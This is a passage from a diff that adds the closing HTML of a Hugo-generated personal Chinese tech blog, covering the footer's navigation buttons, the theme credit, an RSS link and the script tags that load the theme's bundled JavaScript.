+          April 27, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                </ul>
+              </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+
+
+
+
+
+    
+  </div>
+</aside>
+
+      </div>
+    </main><footer class="footer mt-auto py-3 text-center container"><div class="offcanvas offcanvas-bottom h-auto" tabindex="-1" id="offcanvasActionsPanel"
+  aria-labelledby="offcanvasActionsPanelLabel">
+  <div class="offcanvas-header">
+    <div class="offcanvas-title h5" id="offcanvasActionsPanelLabel">
+      <i class="fas fa-fw fa-th-large me-1"></i>
+      操作
+    </div>
+    <button type="button" class="btn-close ms-auto" data-bs-dismiss="offcanvas" data-bs-target="offcanvasActionsPanel" aria-label="Close"></button>
+  </div>
+  <div class="offcanvas-body mt-2"><div class="actions d-flex overflow-auto align-items-center">
+      <a role="button" class="action action-go-back d-flex flex-column align-items-center me-3" href="javascript: window.history.back();">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-chevron-circle-down" data-fa-transform="rotate-90"></i></span> 返回
+      </a>
+      <a role="button" class="action action-reload-page d-flex flex-column align-items-center me-3">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-redo-alt"></i></span> 刷新
+      </a>
+      <a role="button" class="action action-copy-url d-flex flex-column align-items-center me-3">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-link"></i></span> 复制链接
+      </a>
+    </div>
+  </div>
+</div><div class="row text-center">
+  <div class="col-12 mt-2">
+    <p class="mb-2">微风的龙</p>
+    <p class="text-secondary mb-2"><small>微风的龙的个人博客，记录技术、项目和思考。</small></p><div class="copyright mb-2 text-secondary">
+  <small>
+</small>
+</div>
+<div class="powered-by mb-2 text-secondary">
+  <small>
+    Build with ❤️ from the <a class="text-primary" href="https://gohugo.io" target="_blank" rel="noopener noreferrer">Hugo</a> and the <a class="text-primary" href="https://github.com/razonyang/hugo-theme-bootstrap" target="_blank" rel="noopener noreferrer">HBS</a> theme.
+  </small>
+</div>
+
+
+<nav class="social-links nav justify-content-center mb-2 mt-3">
+  <a class="nav-link social-link p-0 me-1 mb-2" target="_blank" data-rss-feed href="https://weifengdel0ng.github.io/index.xml" title="RSS" rel="me">
+    <i class="fas fa-fw fa-2x fa-rss" style="color: #ea6221;"></i>
+  </a>
+</nav>
+</div>
+  <div class="col-12 col-lg-8 offset-0 offset-lg-1"></div>
+</div>
+</footer>
+<script data-precache src="/assets/main/bundle.min.3de74a0b978ed64b15f6e0d25d913177adc77cae61692b679df48c3036ac2c49.js" integrity="sha256-PedKC5eO1ksV9uDSXZExd63HfK5haStnnfSMMDasLEk=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.2afb6643b7cdde837754668abae3dceedc993b71ebefe8bc9c80af3e2e349075.js" integrity="sha256-KvtmQ7fN3oN3VGaKuuPc7tyZO3Hr7&#43;i8nICvPi40kHU=" crossorigin="anonymous" defer></script>
+<script data-precache src="/assets/viewer/bundle.min.13800f940d1d83422ff174b45ece49c4c58a17a608fe79bdba39aec874d4c7fe.js" integrity="sha256-E4APlA0dg0Iv8XS0Xs5JxMWKF6YI/nm9ujmuyHTUx/4=" crossorigin="anonymous" defer></script>
+
+
+  </body>
+</html>
